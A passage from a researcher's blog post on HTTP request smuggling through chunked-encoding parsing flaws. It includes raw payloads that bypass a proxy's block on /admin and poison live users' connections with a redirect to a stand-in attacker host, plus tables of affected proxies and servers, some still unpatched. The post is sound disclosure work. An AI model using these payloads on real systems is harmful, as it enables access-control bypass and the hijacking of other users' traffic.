xx<span class="http-line-break">\r\n</span>
3f<span class="http-line-break">\r\n</span>
0<span class="http-line-break">\r\n</span> 
<span class="http-line-break">\r\n</span></span><span class="http-highlight http-highlight-two">GET /admin HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #2</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Content-Length: 40<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
0<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
GET / HTTP/1.1<span class="http-line-break">\r\n</span>
Host: localhost<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span></span></code></pre>
<p style="text-align: center; font-weight: bold;">Server interpretation</p>
</div>
</div>

From the proxy's perspective, it is now receiving two pipelined requests, so it will happily return two responses. However, what the proxy considers to be the second pipelined request is in fact interpreted as the body of the smuggled request on the back-end. As such, we will obtain the response to the `GET /admin` request in the second response.

An important caveat here is that the payload above will not work if the front-end decides to forward the requests over two separate back-end connections. In this situation, we can obtain the response by instead issuing a series of `GET /` follow-up requests after delivering the payload. One of these should eventually be routed through the same connection as the payload and consequently be served the response to the smuggled request. Of course, this carries with it the risk of another client reaching the poisoned socket first. Incidentally, that is what we will deliberately exploit in the next section.

#### Exploiting live users
A very similar technique can be used to corrupt the requests sent by other live clients of the server. Instead of sending follow-up HTTP requests ourselves, we smuggle a request with an oversized `Content-Length` and wait for another user's request to reach the same socket. The server will interpret the victim's request as the body of the smuggled request, causing the victim to receive the response that the back-end server intended for us.

This is particularly impactful if we have a way of eliciting a harmful response from the server. For example, an otherwise unexploitable header-based open redirect can be used to redirect random live users to a site of our choosing. If the application for instance responds with a `301 Redirect` with a `Location` header reflecting the value of the `X-Forwarded-Host` request header, live users of an EXT.TERM-vulnerable application could be redirected to `attacker-site.io` using the payload below.

<pre><code>GET / HTTP/1.1<span class="http-line-break">\r\n</span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
5f;<span class="http-line-break">\n</span>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span class="http-line-break">\r\n</span>
0<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
GET / HTTP/1.1<span class="http-line-break">\r\n</span>
Host: localhost<span class="http-line-break">\r\n</span>
X-Forwarded-Host: attacker-site.io<span class="http-line-break">\r\n</span>
Content-Length: 100<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
0<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
</code></pre>

Once the front-end forwards another request over the same back-end connection, the server will interpret it as the body of the smuggled request and respond accordingly, leading to the victim being served the malicious redirect. On the back-end, the request looks as shown below.

<pre><code>GET / HTTP/1.1<span class="http-line-break">\r\n</span>
Host: localhost<span class="http-line-break">\r\n</span>
X-Forwarded-Host: attacker-site.io<span class="http-line-break">\r\n</span>
Content-Length: 100<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
0<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-two">GET /some/path HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text">victim's request</span>
Host: localhost<span class="http-line-break">\r\n</span>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...<span class="http-line-break">\r\n</span>
...</span></code></pre>

Such prefixing-based attacks can be adapted in a large variety of ways to perform devastating attacks against live clients with zero user interaction. As these exploitation techniques are not unique to the kinds of request smuggling vulnerabilities we have introduced in this article, I will not discuss them at length here. For a more comprehensive review of such attacks, I recommend the Portswigger Web Security Academy's [article](https://portswigger.net/web-security/request-smuggling/exploiting) on the topic.


### Who's vulnerable?
Having developed these techniques, I set out to find vulnerable proxies and servers. In this endeavor, the amazing [HTTP Garden](https://github.com/narfindustries/http-garden) project created by Ben Kallus and Prashant Anantharaman proved immensely valuable for quickly identifying chunk parsing inconsistencies across a wide range of HTTP implementations. 

Running the black-box probes against a range of bug bounty targets also revealed several instances of real-world request smuggling vulnerabilities that had been overlooked for years. In fact, the EXT.TERM variant was entirely theoretical at the time I developed these probes – the only vulnerable front-end I discovered was a closed-source product identified using a probe against a live target.

Let's take a look at the affected systems.


#### TERM.EXT and EXT.TERM vulnerabilities
First, a brief reminder: In TERM.EXT and EXT.TERM vulnerabilities, the parsing discrepancy is introduced by a `\n` (or another sequence) in a chunk extension. Some parsers will interpret this as a line terminator and others will interpret it as part of the chunk extension, both of which are technically incorrect behaviors.

Interpreting newlines as line terminators turned out to be a *very* common flaw in both web servers and proxies. The limiting factor for exploitation is really normalization rendering the attack impossible in most cases. However, I did manage to discover three well-known vulnerable proxies that do not apply any normalization. Vulnerable servers are more common, since they (unlike proxies) cannot protect themselves by normalizing requests.

I've listed my discoveries in the table below. For more information about the resolution of each vulnerability, hover your mouse over the cell elements.

<table>
  <thead>
    <tr>
      <th></th>
      <th>TERM.EXT</th>
      <th>EXT.TERM</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>Proxies</th>
      <td>
        <span class="tooltip">
          1. Apache Traffic Server
          <span class="tooltiptext">Assigned CVE-2024-53868.</span>
        </span><br>
        <span class="tooltip">
          2. Google Classic Application Load Balancer
          <span class="tooltiptext">Awarded a $15,000 bounty by the Google VRP.</span>
        </span>
      </td>
      <td>
        <span class="tooltip">
          1. Undisclosed cloud CDN
          <span class="tooltiptext">Awarded a $600 bounty.</span>
        </span>
      </td>
    </tr>
    <tr>
      <th>Servers</th>
        <td>
          <span class="tooltip">
            1. AIOHTTP
            <span class="tooltiptext">Assigned CVE-2024-52304.</span>
          </span><br>
          <span class="tooltip">
            2. fasthttp
            <span class="tooltiptext">Fixed in <a href="https://github.com/valyala/fasthttp/pull/1899" target="_blank"><code style="white-space: nowrap">PR #1899</code></a>.</span>
          </span><br>
          <span class="tooltip">
            3. gunicorn
            <span class="tooltiptext">Known issue. Fix pending, see <a href="https://github.com/benoitc/gunicorn/pull/3327" target="_blank"><code style="white-space: nowrap">PR #3327</code></a>.</span>
          </span>
        </td>
        <td>
          <span class="tooltip">
            1. nginx
            <span class="tooltiptext">Decided not to fix.</span>
          </span><br>
          <span class="tooltip">
            2. Eclipse Jetty
            <span class="tooltiptext">Fixed in <a href="https://github.com/jetty/jetty.project/pull/12564" target="_blank"><code style="white-space: nowrap">PR #12564</code></a>.</span>
          </span><br>
          <span class="tooltip">
            3. Eclipse Grizzly
            <span class="tooltiptext">Fixed in <a href="https://github.com/eclipse-ee4j/grizzly/pull/2220" target="_blank"><code style="white-space: nowrap">PR #2220</code></a> (off by default).</span>
          </span><br>
          <span class="tooltip">
            4. netty
            <span class="tooltiptext">No response.</span>
          </span><br>
          <span class="tooltip">
            5. H2O
            <span class="tooltiptext">Fix pending, see <a href="https://github.com/h2o/picohttpparser/pull/82" target="_blank"><code style="white-space: nowrap">PR #82</code></a>.</span>
          </span><br>
          <span class="tooltip">
            6. Golang net/http
            <span class="tooltiptext">Assigned CVE-2025-22871 and awarded a $5,000 bounty by the Google VRP.</span>
          </span><br>
        </td>
    </tr>
  </tbody>
</table>

Any combination of one of these proxies coupled with one of the servers in the same column would result in a vulnerability. As an example, here's a TERM.EXT proof-of-concept attacking an AIOHTTP application behind a Google Cloud Classic Application Load Balancer.

<script src="https://asciinema.org/a/tkF6XXyKTUVuZICZOesYBBbez.js" id="asciicast-tkF6XXyKTUVuZICZOesYBBbez" async="true"></script>

The payload in the video smuggles a `POST /admin` request with an oversized `Content-Length` header past the load balancer (which is configured to reject requests to `/admin`). After a few repeated requests, the response to the smuggled request is served.


#### TERM.SPILL and SPILL.TERM vulnerabilities
For TERM.SPILL and SPILL.TERM vulnerabilities to arise, there must be a discrepancy in the line terminator parsing of the chunk *body*. Additionally, either the server or proxy must accept oversized chunks.

Judging by the results of my own experimentation, TERM.SPILL and SPILL.TERM vulnerabilities are not quite as common as their TERM.EXT and EXT.TERM counterparts. Despite my efforts, I was unable to find a single proxy vulnerable to TERM.SPILL, which therefore remains a completely theoretical vulnerability for now. However, I did discover a few setups vulnerable to the SPILL.TERM variant.

<table>
  <thead>
    <tr>
      <th></th>
      <th>TERM.SPILL</th>
      <th>SPILL.TERM</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>Proxies</th>
      <td>
        <span class="tooltip">
          <i>None</i>
          <span class="tooltiptext">No TERM.SPILL-vulnerable proxies were found.</span>
        </span>
      </td>
      <td>
        <span class="tooltip">
          1. Google Classic Application Load Balancer
          <span class="tooltiptext">Assigned CVE-2025-4600 and awarded a $15,000 bounty by the Google VRP.</span>
        </span><br>
        <span class="tooltip">
          2. pound
          <span class="tooltiptext">Fixed in <a href="https://github.com/graygnuorg/pound/pull/43" target="_blank"><code style="white-space: nowrap">PR #43</code></a>.</span>
        </span>
      </td>
    </tr>
    <tr>
      <th>Servers</th>
        <td>
          <span class="tooltip">
            1. netty<br>
            2. Eclipse Grizzly<br>
            3. undertow
            <span class="tooltiptext">These servers accept spills. This is non-exploitable unless a vulnerable proxy exists.</span>
          </span><br>
        </td>
        <td>
          <span class="tooltip">
            1. uvicorn and hypercorn (<a href="https://github.com/python-hyper/h11" target="_blank">h11</a> dependency)
            <span class="tooltiptext">Assigned CVE-2025-43859.</span>
          </span><br>
          <span class="tooltip">
            2. Ktor
            <span class="tooltiptext">Assigned CVE-2025-29904 and awarded a $300 bounty by JetBrains.</span>
          </span><br>
          <span class="tooltip">
            3. Eclipse Jetty
            <span class="tooltiptext">Fixed in <a href="https://github.com/jetty/jetty.project/pull/12564" target="_blank"><code style="white-space: nowrap">PR #12564</code></a>.</span>
          </span><br>
          <span class="tooltip">
            4. uHTTPd
            <span class="tooltiptext">In discussion, see <a href="https://github.com/openwrt/uhttpd/pull/4" target="_blank"><code style="white-space: nowrap">PR #4</code></a>.</span>
          </span>
        </td>
    </tr>
  </tbody>
</table>

Although categorized together, the parsing flaws in the table above are not exactly identical. Specifically, Ktor interpreted `\r` as a line terminator whereas h11 and uHTTPd accepted any 2-byte sequence. Jetty treated the CRLF as optional, effectively interpreting an empty string as a line terminator. On the proxy side, there was a minor difference as well: pound did not allow `\r` in the spill (unlike the Google Cloud load balancer). This means that pound-Ktor is notably *not* a vulnerable setup. 


### Closing thoughts
One thing that became clear to me during my discussions with various vendors and maintainers is that HTTP servers *really* care about robustness. Many were reluctant to adopt stricter parsing rules, fearing that they might break compatibility with non-compliant clients. Vulnerabilities like the ones described in this post reveal a fundamental disharmony between security and robustness: we simply cannot allow parsing leniencies without simultaneously opening the door to misinterpretations, at least a little bit.

While a great deal of attention has been given to request smuggling attacks based on the ambiguity of requests with both a `Content-Length` and `Transfer-Encoding: chunked` header, it seems to me that techniques based on chunked-body parsing flaws have largely been overlooked. I find it remarkable that the techniques we've explored in this article have remained undiscovered for so long, despite their relative simplicity. One cannot help but wonder: how many dangerous HTTP parser bugs are still out there, waiting to be found?

<br><br>

-------------

<br><br>

If you have any comments or questions about this post, I'd love to hear them. Seriously. It would be great to know if anyone actually reads this. Feel free to reach out to me on X ([@__wake](https://x.com/__w4ke)) or shoot me an email at [jeppe.b.weikop@gmail.com](mailto:jeppe.b.weikop@gmail.com).


